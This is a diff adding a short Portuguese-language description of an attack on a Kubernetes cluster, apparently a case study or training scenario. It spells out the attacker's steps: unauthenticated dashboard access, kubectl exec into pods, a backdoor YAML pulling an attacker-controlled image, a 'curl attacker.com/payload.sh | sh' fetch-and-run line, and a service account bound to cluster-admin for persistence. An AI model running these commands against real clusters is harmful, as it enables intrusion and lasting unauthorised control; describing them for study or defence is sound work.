@@ -1,0 +1,5 @@
+Em um ambiente de cluster Kubernetes exposto parcialmente à internet, o atacante explorou uma configuração insegura do painel de administração, acessível sem autenticação. A partir desse painel, o invasor obteve acesso à API do Kubernetes e implantou um novo container aparentemente legítimo. O container continha uma imagem manipulada com binários adicionais, incluindo um script de conexão reversa que mantinha persistência no cluster.
+
+Durante o ataque, foram utilizados comandos como kubectl get pods -A, kubectl exec -it podname -- /bin/sh e kubectl apply -f backdoor.yaml, onde o arquivo YAML especificava uma imagem de container hospedada em um repositório público controlado pelo atacante. O script malicioso dentro do container executava curl attacker.com/payload.sh | sh, estabelecendo comunicação com um servidor remoto.
+
+Após comprometer o container, o invasor criou uma nova conta de serviço com permissões elevadas usando kubectl create serviceaccount admin-access e a associou ao cluster role cluster-admin, garantindo acesso contínuo.
